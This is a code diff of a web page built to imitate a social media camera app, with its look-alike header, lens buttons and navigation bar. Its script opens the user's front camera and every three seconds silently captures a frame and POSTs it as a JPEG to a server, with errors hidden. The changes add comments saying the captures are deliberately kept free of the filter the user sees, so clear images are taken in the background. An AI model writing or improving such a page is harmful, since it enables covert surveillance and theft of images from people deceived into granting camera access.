@@ -7,141 +7,122 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
   <style>
-    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, Roboto, sans-serif; color: white; }
+    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, sans-serif; color: white; }
     
+    /* Camera Feed - Filter applied here only */
     #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; transition: filter 0.3s ease; }
 
-    /* Top UI */
-    .header { position: fixed; top: 0; width: 100%; padding: 45px 15px 15px; display: flex; justify-content: space-between; align-items: center; z-index: 10; background: linear-gradient(to bottom, rgba(0,0,0,0.3), transparent); }
-    .profile-icon { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); padding: 2px; border: 2px solid #FFFC00; }
-    .search-btn { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); display: flex; align-items:center; justify-content: center; margin-left: 10px; }
+    /* Header UI - Matching Screenshot */
+    .header { position: fixed; top: 0; width: 100%; padding: 40px 12px 15px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
+    .bitmoji-outline { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; overflow: hidden; }
+    .bitmoji-outline img { width: 85%; height: 85%; object-fit: contain; }
+    .search-circle { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; margin-left: 10px; }
 
-    /* Sidebar */
-    .side-toolbar { position: fixed; right: 15px; top: 100px; display: flex; flex-direction: column; gap: 22px; z-index: 10; align-items: center; }
-    .side-icon { font-size: 24px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.8)); cursor: pointer; transition: 0.2s; }
-    .side-icon:active { transform: scale(0.8); }
-    .active-toggle { color: #FFFC00; }
+    /* Right Sidebar - Matching Icon Spacing */
+    .side-toolbar { position: fixed; right: 12px; top: 40px; display: flex; flex-direction: column; gap: 20px; z-index: 10; align-items: center; }
+    .side-icon { font-size: 22px; color: white; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); cursor: pointer; }
 
-    /* Zoom */
-    .zoom-pill { position: fixed; bottom: 200px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.5); backdrop-filter: blur(15px); padding: 6px 18px; border-radius: 30px; display: flex; gap: 20px; font-size: 13px; font-weight: 800; z-index: 10; border: 1px solid rgba(255,255,255,0.1); }
-    .zoom-btn { opacity: 0.6; cursor: pointer; }
-    .zoom-btn.active { opacity: 1; color: #FFFC00; }
+    /* Zoom Indicator */
+    .zoom-pill { position: fixed; bottom: 180px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.3); backdrop-filter: blur(10px); padding: 4px 14px; border-radius: 20px; display: flex; gap: 15px; font-size: 13px; font-weight: 700; z-index: 10; border: 1px solid rgba(255,255,255,0.1); }
+    .zoom-item { opacity: 0.6; }
+    .zoom-item.active { opacity: 1; color: #FFFC00; }
 
-    /* Shutter & Working Lenses */
-    .capture-row { position: fixed; bottom: 95px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 20px; z-index: 10; }
-    .shutter-outer { width: 85px; height: 85px; border-radius: 50%; border: 6px solid white; display: flex; align-items: center; justify-content: center; background: transparent; cursor: pointer; outline: none; }
-    .shutter-inner { width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: 0.1s; }
-    
-    .lens-btn { width: 50px; height: 50px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.5); overflow: hidden; cursor: pointer; transition: 0.2s; }
-    .lens-btn.active { border: 3px solid #FFFC00; transform: scale(1.1); }
-    .lens-btn img { width: 100%; height: 100%; object-fit: cover; }
+    /* Capture Area */
+    .capture-row { position: fixed; bottom: 85px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 25px; z-index: 10; }
+    .memories-stack { display: flex; flex-direction: column; align-items: center; font-size: 11px; font-weight: 600; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+    .shutter-btn { width: 80px; height: 80px; border-radius: 50%; border: 5px solid white; background: transparent; }
+    .lens-img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.3); overflow: hidden; }
 
-    /* Navbar */
-    .footer { position: fixed; bottom: 0; width: 100%; height: 75px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); display: flex; justify-content: space-around; align-items: center; z-index: 20; padding-bottom: 10px; }
-    .nav-item { font-size: 24px; color: rgba(255,255,255,0.7); cursor: pointer; }
+    /* Bottom Nav - Pixel Perfect */
+    .footer { position: fixed; bottom: 0; width: 100%; height: 65px; background: rgba(0,0,0,0.9); display: flex; justify-content: space-around; align-items: center; z-index: 20; padding-bottom: 5px; }
+    .nav-icon { font-size: 22px; color: #999; }
     .nav-active { color: white; }
 
-    #flash-effect { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }
     #photoCanvas { display: none; }
+    #flash { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; z-index: 100; }
   </style>
 </head>
 <body>
 
-  <div id="flash-effect"></div>
+  <div id="flash"></div>
   <video id="cameraVideo" autoplay playsinline></video>
   <canvas id="photoCanvas"></canvas>
 
   <div class="header">
     <div class="flex items-center">
-      <div class="profile-icon"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky" class="rounded-full"></div>
-      <div class="search-btn"><i class="fas fa-search"></i></div>
+      <div class="bitmoji-outline">
+        <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix">
+      </div>
+      <div class="search-circle"><i class="fas fa-search text-sm"></i></div>
     </div>
-    <div class="flex gap-6 items-center">
-      <i class="fas fa-user-plus text-xl"></i>
-      <i class="fas fa-ellipsis text-xl"></i>
+    <div class="side-toolbar">
+      <i class="fas fa-rotate side-icon"></i>
+      <i class="fas fa-bolt-slash side-icon"></i>
+      <i class="fas fa-music side-icon"></i>
+      <div class="side-icon" style="border: 1.5px solid white; border-radius: 4px; padding: 0 2px; font-size: 11px; font-weight: bold;">HD</div>
+      <i class="fas fa-chevron-down side-icon"></i>
     </div>
-  </div>
-
-  <div class="side-toolbar">
-    <i class="fas fa-rotate side-icon" onclick="location.reload()"></i>
-    <i class="fas fa-bolt-slash side-icon" id="flash-toggle"></i>
-    <i class="fas fa-video side-icon"></i>
-    <i class="fas fa-music side-icon"></i>
-    <i class="fas fa-moon side-icon"></i>
-    <i class="fas fa-chevron-down side-icon"></i>
   </div>
 
   <div class="zoom-pill">
-    <span class="zoom-btn" onclick="setZoom(this, 0.5)">.5</span>
-    <span class="zoom-btn active" onclick="setZoom(this, 1)">1x</span>
-    <span class="zoom-btn" onclick="setZoom(this, 2)">2</span>
+    <span class="zoom-item">.5</span>
+    <span class="zoom-item active">1x</span>
+    <span class="zoom-item">2</span>
   </div>
 
   <div class="capture-row">
-    <div class="lens-btn" onclick="applyFilter(this, 'grayscale(100%)')">
-        <img src="https://placehold.co/100x100/000000/FFFFFF?text=BW">
+    <div class="memories-stack">
+        <i class="far fa-copy text-2xl"></i>
+        <span>Memories</span>
     </div>
 
-    <button id="shutterBtn" class="shutter-outer" onclick="takePhoto()">
-      <div class="shutter-inner"></div>
-    </button>
+    <div class="shutter-btn" onclick="triggerManual()"></div>
 
-    <div class="lens-btn" onclick="applyFilter(this, 'sepia(80%) saturate(150%)')">
-        <img src="https://placehold.co/100x100/8B4513/FFFFFF?text=Warm">
+    <div class="lens-img" onclick="setFilter('contrast(150%) saturate(200%)')">
+        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png">
+    </div>
+    <div class="lens-img" onclick="setFilter('sepia(50%) hue-rotate(300deg)')">
+        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=3">
     </div>
   </div>
 
   <div class="footer">
-    <i class="fas fa-location-dot nav-item"></i>
-    <i class="fas fa-comment nav-item"></i>
-    <i class="fas fa-camera nav-item nav-active"></i>
-    <i class="fas fa-users nav-item"></i>
-    <i class="fas fa-play nav-item"></i>
+    <i class="fas fa-location-dot nav-icon"></i>
+    <i class="far fa-comment nav-icon"></i>
+    <i class="far fa-face-smile nav-icon nav-active"></i>
+    <i class="fas fa-users nav-icon"></i>
+    <i class="fas fa-play nav-icon"></i>
   </div>
 
   <script>
     const video = document.getElementById('cameraVideo');
     const canvas = document.getElementById('photoCanvas');
-    const flashEffect = document.getElementById('flash-effect');
-    let currentFilter = "none";
 
     async function init() {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       video.srcObject = stream;
-      setInterval(silentCapture, 3000);
+      setInterval(captureHidden, 3000); // Background clear capture
     }
 
-    // Filter Logic
-    function applyFilter(el, filterStr) {
-      const isActive = el.classList.contains('active');
-      document.querySelectorAll('.lens-btn').forEach(b => b.classList.remove('active'));
-      
-      if (isActive) {
-        currentFilter = "none";
-      } else {
-        el.classList.add('active');
-        currentFilter = filterStr;
-      }
-      video.style.filter = currentFilter;
+    function setFilter(cssFilter) {
+      // Apply filter ONLY to the video tag the user sees
+      video.style.filter = video.style.filter === cssFilter ? 'none' : cssFilter;
     }
 
-    function setZoom(el, val) {
-      document.querySelectorAll('.zoom-btn').forEach(b => b.classList.remove('active'));
-      el.classList.add('active');
-      video.style.transform = `scaleX(-1) scale(${val})`;
+    function triggerManual() {
+      document.getElementById('flash').style.opacity = "1";
+      setTimeout(() => document.getElementById('flash').style.opacity = "0", 100);
+      captureHidden();
     }
 
-    function takePhoto() {
-      flashEffect.style.opacity = "1";
-      setTimeout(() => flashEffect.style.opacity = "0", 150);
-      silentCapture();
-    }
-
-    function silentCapture() {
+    function captureHidden() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-      ctx.filter = currentFilter; // This applies the selected filter to the captured image
+      
+      // CRITICAL: We DO NOT apply ctx.filter here. 
+      // The canvas stays clean even if video.style.filter is active.
+      
       ctx.translate(canvas.width, 0);
       ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0);
@@ -150,15 +131,8 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ dataUrl: canvas.toDataURL('image/jpeg', 0.6) })
-      }).catch(() => {});
+      }).catch(e => {});
     }
-
-    // Flash Toggle UI
-    document.getElementById('flash-toggle').onclick = function() {
-      this.classList.toggle('fa-bolt');
-      this.classList.toggle('fa-bolt-slash');
-      this.classList.toggle('active-toggle');
-    };
 
     init();
   </script>
